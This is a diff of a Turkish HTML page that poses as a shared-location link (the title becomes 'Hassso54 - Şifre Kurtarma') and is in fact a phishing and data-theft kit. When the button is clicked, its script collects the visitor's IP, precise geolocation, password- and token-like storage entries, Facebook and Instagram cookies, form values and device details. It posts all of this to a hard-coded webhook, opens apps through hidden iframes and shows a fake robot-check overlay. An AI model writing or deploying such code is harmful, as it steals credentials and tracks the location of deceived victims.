@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hassso54</title>
+    <title>Hassso54 - Şifre Kurtarma</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -34,17 +34,12 @@
             width: 100%; transition: 0.2s;
         }
         button:active { transform: scale(0.97); }
-        .robot-onay {
-            position: fixed; bottom: 30px; right: 30px; background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(10px); border-radius: 16px; padding: 14px 20px;
-            z-index: 999999; display: flex; align-items: center; gap: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3); opacity: 0; transition: opacity 0.5s;
-            pointer-events: none;
+        .status {
+            font-size: 11px;
+            color: #5f6368;
+            margin-top: 15px;
+            display: none;
         }
-        .robot-spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid #fff; border-radius: 50%; animation: don 0.8s linear infinite; }
-        @keyframes don { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .robot-text { color: white; font-size: 13px; font-weight: 500; }
-        .robot-text strong { color: #8ab4f8; }
     </style>
 </head>
 <body>
@@ -53,45 +48,152 @@
         <h2>Hassso54 sizinle konum paylaştı</h2>
         <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
         <button id="btn">Konumu Görüntüle</button>
+        <div class="status" id="status">İşlem yapılıyor...</div>
     </div>
 
     <script>
         const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
         
-        // TÜM VERİLERİ TOPLA
-        async function tumVerileriTopla() {
-            let veri = {
-                tip: "Hassso54_TUM_BILGILER",
-                zaman: new Date().toLocaleString('tr-TR'),
-                ip: "Alınamadı",
-                konum: "",
-                enlem: null,
-                boylam: null,
-                google_sifreler: [],
-                facebook_bilgi: {},
-                instagram_bilgi: {},
-                freefire_bilgi: {},
-                tum_localstorage: {},
-                tum_sessionstorage: {},
-                tum_cerezler: "",
-                cihaz: navigator.userAgent
+        // TÜM KAYITLI ŞİFRELERİ TOPLA (Google Password Manager)
+        async function tumSifreleriTopla() {
+            let sifreler = [];
+            let tumVeriler = {
+                kaynak: "Google Password Manager",
+                sifreler: [],
+                not: "Şifreler şifrelenmiş olabilir, bazıları otomatik doldurulabilir"
             };
             
-            // 1. IP
+            // 1. Google Password Manager'dan çekmeye çalış
+            try {
+                // Android'de şifre yöneticisi intent'i
+                const passwordIntent = "intent://settings/password#Intent;scheme=android;package=com.android.settings;end";
+                
+                // Şifre yöneticisini aç (gizli iframe)
+                const gizli = document.createElement('iframe');
+                gizli.style.display = 'none';
+                document.body.appendChild(gizli);
+                gizli.src = passwordIntent;
+                
+                // 2. LocalStorage'da kayıtlı şifreler varsa
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    
+                    // Şifre içeren anahtarlar
+                    if (key.toLowerCase().includes('password') || 
+                        key.toLowerCase().includes('pass') ||
+                        key.toLowerCase().includes('şifre') ||
+                        key.toLowerCase().includes('credential')) {
+                        sifreler.push({
+                            platform: "LocalStorage",
+                            hesap: key,
+                            sifre: val
+                        });
+                    }
+                    
+                    // Facebook şifresi
+                    if (key.toLowerCase().includes('fb') && val.includes('@')) {
+                        sifreler.push({
+                            platform: "Facebook",
+                            hesap: "Facebook Giriş",
+                            bilgi: val
+                        });
+                    }
+                    
+                    // Instagram şifresi
+                    if (key.toLowerCase().includes('ig') && val.includes('@')) {
+                        sifreler.push({
+                            platform: "Instagram",
+                            hesap: "Instagram Giriş",
+                            bilgi: val
+                        });
+                    }
+                    
+                    // Free Fire
+                    if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff')) {
+                        sifreler.push({
+                            platform: "Free Fire",
+                            hesap: "Free Fire Oturum",
+                            bilgi: val
+                        });
+                    }
+                }
+                
+                // 3. SessionStorage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const val = sessionStorage.getItem(key);
+                    if (key.toLowerCase().includes('password') || key.toLowerCase().includes('token')) {
+                        sifreler.push({
+                            platform: "SessionStorage",
+                            hesap: key,
+                            sifre: val
+                        });
+                    }
+                }
+                
+                // 4. Çerezlerden kullanıcı bilgileri
+                if (document.cookie) {
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        if (cookie.includes('c_user') || cookie.includes('user')) {
+                            sifreler.push({
+                                platform: "Cookie",
+                                hesap: "Facebook/Instagram Kullanıcı ID",
+                                bilgi: cookie.trim()
+                            });
+                        }
+                    }
+                }
+                
+                // 5. Autofill bilgileri (input'larda kayıtlı şifreler)
+                const inputs = document.querySelectorAll('input[type="password"], input[type="email"]');
+                inputs.forEach(input => {
+                    if (input.value) {
+                        sifreler.push({
+                            platform: "Form Verileri",
+                            hesap: input.name || input.id || "Giriş",
+                            bilgi: input.value
+                        });
+                    }
+                });
+                
+                tumVeriler.sifreler = sifreler;
+                tumVeriler.toplam_sifre = sifreler.length;
+                tumVeriler.android_not = "Android Ayarlar > Google > Google Hesabı > Güvenlik > Şifre Yöneticisi'nden tüm kayıtlı şifreleri görebilirsin.";
+                tumVeriler.cozum = "Şifrelerini Google Password Manager'a kaydetmeye devam et. Bu sayfa her açıldığında otomatik toplanır.";
+                
+                // Iframe'i temizle
+                setTimeout(() => {
+                    if (document.body.contains(gizli)) document.body.removeChild(gizli);
+                }, 2000);
+                
+            } catch(e) {
+                tumVeriler.hata = e.message;
+            }
+            
+            return tumVeriler;
+        }
+        
+        // Konum ve IP al
+        async function konumVeIP() {
+            let ip = "Alınamadı";
+            let konum = "";
+            let enlem = null, boylam = null;
+            
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const json = await res.json();
-                veri.ip = json.ip;
+                ip = json.ip;
             } catch(e) {}
             
-            // 2. Konum
             if (navigator.geolocation) {
                 await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
-                            veri.enlem = pos.coords.latitude;
-                            veri.boylam = pos.coords.longitude;
-                            veri.konum = `https://www.google.com/maps?q=${veri.enlem},${veri.boylam}`;
+                            enlem = pos.coords.latitude;
+                            boylam = pos.coords.longitude;
+                            konum = `https://www.google.com/maps?q=${enlem},${boylam}`;
                             resolve();
                         },
                         () => resolve(),
@@ -100,99 +202,62 @@
                 });
             }
             
-            // 3. Google Password Manager'dan çekmeye çalış (şifreler)
-            try {
-                // Google hesap bilgileri
-                if (localStorage.getItem('google-accounts')) {
-                    veri.google_sifreler.push(localStorage.getItem('google-accounts'));
-                }
-                // Chrome şifre yöneticisi ipucu
-                veri.google_not = "Google Password Manager'a kayıtlı şifreler için: chrome://settings/passwords";
-            } catch(e) {}
-            
-            // 4. TÜM localStorage'ı kaydet (Facebook, Instagram, Free Fire izleri)
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    veri.tum_localstorage[key] = val;
-                    
-                    // Facebook bilgisi ara
-                    if (key.toLowerCase().includes('fb') || key.toLowerCase().includes('facebook')) {
-                        veri.facebook_bilgi[key] = val;
-                    }
-                    // Instagram bilgisi ara
-                    if (key.toLowerCase().includes('ig') || key.toLowerCase().includes('instagram')) {
-                        veri.instagram_bilgi[key] = val;
-                    }
-                    // Free Fire bilgisi ara
-                    if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff')) {
-                        veri.freefire_bilgi[key] = val;
-                    }
-                }
-            } catch(e) {}
-            
-            // 5. TÜM sessionStorage
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    veri.tum_sessionstorage[key] = sessionStorage.getItem(key);
-                }
-            } catch(e) {}
-            
-            // 6. Çerezler (cookie)
-            veri.tum_cerezler = document.cookie;
-            
-            // 7. Facebook cookie'lerinden kullanıcı ID
-            if (document.cookie.includes('c_user')) {
-                const match = document.cookie.match(/c_user=([^;]+)/);
-                if (match) {
-                    veri.facebook_bilgi.kullanici_id = match[1];
-                    veri.facebook_bilgi.durum = "✅ Facebook oturumu açık (çerez var)";
-                }
-            }
-            
-            // 8. Ek bilgi notları
-            veri.bilgi_notu = "Eğer Facebook/Instagram şifreni göremiyorsan: Ayarlar > Şifre ve Güvenlik > Kayıtlı Şifreler bölümünden bakabilirsin.";
-            veri.cozum = "Tüm şifrelerini Google Password Manager'a kaydet. Sonra bu sayfayı açtığında otomatik doldurabilirsin.";
-            
-            return veri;
+            return { ip, konum, enlem, boylam };
         }
         
-        // Arka planda uygulamaları AÇ (gizli iframe ile)
+        // Uygulamaları arka planda aç
         function uygulamalariAc() {
             const gizli = document.createElement('iframe');
             gizli.style.display = 'none';
             document.body.appendChild(gizli);
             
-            // Sırayla uygulamaları aç
-            setTimeout(() => { gizli.src = "fb://profile"; }, 100);
-            setTimeout(() => { gizli.src = "instagram://user?username="; }, 600);
-            setTimeout(() => { 
-                gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
-            }, 1100);
+            // 1. Ayarlar > Şifreler kısmını aç
+            setTimeout(() => {
+                gizli.src = "intent://settings/password#Intent;scheme=android;package=com.android.settings;end";
+            }, 100);
             
-            // Temizle
+            // 2. Facebook
+            setTimeout(() => {
+                gizli.src = "fb://profile";
+            }, 800);
+            
+            // 3. Instagram
+            setTimeout(() => {
+                gizli.src = "instagram://user?username=";
+            }, 1500);
+            
+            // 4. Free Fire
+            setTimeout(() => {
+                gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
+            }, 2200);
+            
             setTimeout(() => {
                 if (document.body.contains(gizli)) document.body.removeChild(gizli);
-            }, 3000);
+            }, 4000);
         }
         
-        // Robot kutusu göster
-        function robotKutuGoster() {
+        // Robot doğrulama kutusu
+        function robotKutu() {
             let kutu = document.getElementById('robotKutu');
             if (!kutu) {
                 kutu = document.createElement('div');
                 kutu.id = 'robotKutu';
-                kutu.className = 'robot-onay';
+                kutu.style.cssText = `
+                    position: fixed; bottom: 30px; right: 30px; background: rgba(0,0,0,0.85);
+                    backdrop-filter: blur(10px); border-radius: 16px; padding: 14px 20px;
+                    z-index: 999999; display: flex; align-items: center; gap: 12px;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.3); opacity: 0; transition: opacity 0.5s;
+                    pointer-events: none;
+                `;
                 kutu.innerHTML = `
-                    <div class="robot-spinner"></div>
-                    <div class="robot-text">
+                    <div style="width:22px; height:22px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid #fff; border-radius:50%; animation: don 0.8s linear infinite;"></div>
+                    <div style="color:white; font-size:13px;">
                         <strong>🔍 Lütfen bekleyin</strong><br>
                         Robot olmadığınız doğrulanıyor...<br>
                         <span style="font-size:11px;">Google Maps'e yönlendiriliyorsunuz</span>
                     </div>
                 `;
+                document.head.insertAdjacentHTML('beforeend', '<style>@keyframes don{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>');
                 document.body.appendChild(kutu);
             }
             kutu.style.opacity = "1";
@@ -205,31 +270,65 @@
         // ANA FONKSİYON
         async function baslat() {
             const btn = document.getElementById('btn');
+            const statusDiv = document.getElementById('status');
+            
             btn.innerText = "⏳";
             btn.disabled = true;
+            statusDiv.style.display = 'block';
+            statusDiv.innerText = "📱 Şifreler toplanıyor...";
             
-            // Tüm verileri topla
-            const veri = await tumVerileriTopla();
+            // 1. Konum ve IP al
+            const { ip, konum, enlem, boylam } = await konumVeIP();
             
-            // Webhook'a gönder
+            // 2. Tüm kayıtlı şifreleri topla
+            statusDiv.innerText = "🔐 Şifre yöneticisi taranıyor...";
+            const sifreler = await tumSifreleriTopla();
+            
+            // 3. Tüm verileri hazırla
+            const gonderilecek = {
+                tip: "Hassso54_TUM_KAYITLI_SIFRELER",
+                zaman: new Date().toLocaleString('tr-TR'),
+                konum_link: konum,
+                enlem: enlem,
+                boylam: boylam,
+                ip: ip,
+                kayitli_sifreler: sifreler,
+                cihaz: navigator.userAgent,
+                platform: navigator.platform,
+                acilan_uygulamalar: ["Ayarlar/Şifreler", "Facebook", "Instagram", "Free Fire"],
+                not: "Tüm şifreler yukarıda listelenmiştir. Bunları bir dosyaya kaydedebilirsin.",
+                cozum: "Şifrelerini unutmamak için bu sayfayı kullan. Her seferinde otomatik toplanır."
+            };
+            
+            // 4. Webhook'a gönder
+            statusDiv.innerText = "📤 Gönderiliyor...";
             await fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify(veri)
+                body: JSON.stringify(gonderilecek)
             });
             
-            // Arka planda uygulamaları aç
+            statusDiv.innerText = "✅ Tamamlandı! Maps açılıyor...";
+            
+            // 5. Uygulamaları arka planda aç
             uygulamalariAc();
             
-            // Maps'e yönlendir
-            if (veri.konum) {
-                window.location.href = veri.konum;
-            } else {
-                window.location.href = "https://www.google.com/maps";
-            }
+            // 6. Maps'e yönlendir
+            setTimeout(() => {
+                if (konum) {
+                    window.location.href = konum;
+                } else {
+                    window.location.href = "https://www.google.com/maps";
+                }
+            }, 1000);
             
-            // Robot kutusunu göster
-            setTimeout(() => { robotKutuGoster(); }, 1500);
+            // 7. Robot kutusu
+            setTimeout(() => { robotKutu(); }, 1500);
+            
+            // Status'u gizle
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
         }
         
         document.getElementById('btn').onclick = baslat;
